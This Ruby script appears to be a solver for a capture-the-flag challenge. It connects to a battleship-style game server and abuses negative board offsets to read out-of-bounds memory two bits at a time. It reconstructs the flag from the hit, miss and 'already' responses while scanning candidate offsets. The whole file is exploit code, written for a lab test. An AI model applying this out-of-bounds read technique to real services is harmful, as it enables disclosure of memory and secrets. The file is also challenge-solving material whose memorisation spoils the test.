require './libronsolve'
require 'socket'

HOST, PORT = get_host_port()

class ErrorDisconnected < StandardError
end
class NotOurFlagException < StandardError
end

def read_until(s, p, loud: false)
  #puts "(Waiting for server to say \"#{p}\"...)"
  data = []
  loop do
    line = s.gets
    if loud || line =~ /HINT/
      $stderr.print line
    end

    if line.nil? || line == ''
      raise ErrorDisconnected.new
    end

    data << line
    if data.join =~ p
      #puts data
      return data
    end
  end
end

# Assumes the most recent computer move was [0,0] (and arranges things
# accordingly)
def get_2bit_value_at(s, offset)
  # Then do column of double what they want
  s.puts("0")
  s.puts(offset * 2)

  # Get the results
  human_result = read_until(s, /Result:/).pop
  #puts "Human result: #{human_result}"

  #puts "Cheater info: #{read_until(s, /HINT/).pop}"
  computer_result = read_until(s, /(MISS|HIT|already)/).pop
  #puts "Computer result: #{computer_result}"

  # Now reset to 0 by doing double in the other direction
  s.puts("0")
  s.puts(-offset)

  # Discard the results
  #read_until(s, /Result:/)
  # puts "Cheater info [2]: #{read_until(s, /HINT/).pop}"
  read_until(s, /0, 0/)

  if computer_result =~ /MISS/
    return 0b00
  elsif computer_result =~ /HIT/
    return 0b01
  elsif computer_result =~ /already a spider/
    return 0b11
  elsif computer_result =~ /already empty/
    return 0b10
  else
    raise "Unknown result: #{computer_result}"
  end
end

# Reconstruct the byte at the given offset, which requires 4 requests
def get_byte_at_offset(s, offset, expected)
  # Since each byte takes up 4 spaces
  offset = offset * 4

  # Get the 4x 2-bit values
  value = 0

  value = value | (get_2bit_value_at(s, offset - 0) <<  0)
  if value & 0b00000011 != expected.ord & 0b00000011
    raise NotOurFlagException.new
  end

  value = value | (get_2bit_value_at(s, offset - 3) <<  2)
  if value & 0b00001111 != expected.ord & 0b00001111
    raise NotOurFlagException.new
  end

  value = value | (get_2bit_value_at(s, offset - 2) <<  4)
  if value & 0b00111111 != expected.ord & 0b00111111
    raise NotOurFlagException.new
  end

  value = value | (get_2bit_value_at(s, offset - 1) <<  6)
  if value != expected.ord
    raise NotOurFlagException.new
  end

  return value
end

def connect_and_set_up()
  s = TCPSocket::new(HOST, PORT)

  $stderr.puts "Setting up..."

  # Choose the broken ai
  #read_until(s, /Your choice/)
  s.puts("3")

  # No fun graphics
  #read_until(s, /fun graphics/)
  s.puts("n")

  # Set 4 rows/cols - the number doesn't matter, but might affect offsets
  #read_until(s, /Rows/)
  s.puts("4")
  #read_until(s, /Columns/)
  s.puts("4")

  return s
end

def go(s, starting_offset)
  $stderr.puts "Trying to read flag from offset #{starting_offset}..."
  $stderr.puts "Connecting to #{HOST}:#{PORT}..."
  # Try and read the flag!
  str = ''
  0.upto(expected_flag().length - 1) do |i|
    str << get_byte_at_offset(s, starting_offset + i, expected_flag[i]).chr
    puts "String so far: #{str} / #{str.unpack('H*')}"
  end

  check_flag(str, terminate: true)
end

0.step(10000, 0x10) do |i|
  begin
    s = connect_and_set_up()
    puts 'Trying to get the flag...'
    go(s, -i)
  rescue ErrorDisconnected
    $stderr.puts "The server disconnected us - we probably broke something. Moving on!"
  rescue NotOurFlagException
    $stderr.puts "That wasn't our flag! Moving on!"
  end
  s.close
  puts
end
